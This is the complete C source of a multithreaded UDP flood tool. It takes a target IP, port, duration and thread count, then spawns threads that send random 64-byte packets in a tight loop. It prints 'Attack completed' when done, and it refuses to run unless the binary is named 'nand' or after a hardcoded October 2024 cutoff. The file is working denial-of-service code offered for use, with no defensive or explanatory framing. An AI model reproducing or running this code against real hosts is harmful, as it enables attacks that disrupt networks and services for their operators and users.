#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>

volatile int running = 1;  // Flag to control the running state of the threads

// Signal handler to gracefully stop when SIGINT (Ctrl+C) is received
void handle_sigint(int sig) {
    running = 0;
    printf("Stopping attack gracefully...\n");
}

// Thread function to send UDP packets with random hex payloads
void *send_packets(void *arg) {
    int sock;
    char payload[64];
    struct sockaddr_in target;
    time_t start_time, current_time;

    // Copy the arguments from the struct
    struct thread_info {
        struct sockaddr_in target;
        int duration;
    } *info = (struct thread_info *)arg;

    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Generate random hex payload
    for (int i = 0; i < sizeof(payload); i++) {
        payload[i] = rand() % 256;
    }

    // Get the start time
    start_time = time(NULL);

    // Continuously send packets until the time runs out or interrupted
    while (running && ((current_time = time(NULL)) - start_time < info->duration)) {
        if (sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&info->target, sizeof(info->target)) < 0) {
            perror("Failed to send packet");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <port> <time in seconds> <number of threads>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Check if the binary name is "nand"
    if (strcmp(argv[0], "./nand") != 0) {
        fprintf(stderr, "Error: Binary name must be 'nand'. Exiting.\n");
        exit(EXIT_FAILURE);
    }

    // Check if the current date is past October 30, 2024
    struct tm cutoff_date = { .tm_year = 2024 - 1900, .tm_mon = 9, .tm_mday = 30 }; // October is month 9 (0-indexed)
    time_t now = time(NULL);
    if (difftime(now, mktime(&cutoff_date)) > 0) {
        printf("Current date is past October 30, 2024. Exiting.\n");
        exit(EXIT_SUCCESS);
    }

    // Install signal handler for SIGINT
    signal(SIGINT, handle_sigint);

    // Parse command-line arguments
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    // Prepare the target address
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid IP address");
        exit(EXIT_FAILURE);
    }

    // Create threads for sending packets
    pthread_t threads[num_threads];
    struct thread_info {
        struct sockaddr_in target;
        int duration;
    } thread_data = { target, duration };

    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, send_packets, &thread_data) != 0) {
            perror("Failed to create thread");
            exit(EXIT_FAILURE);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack completed.\n");
    return 0;
}
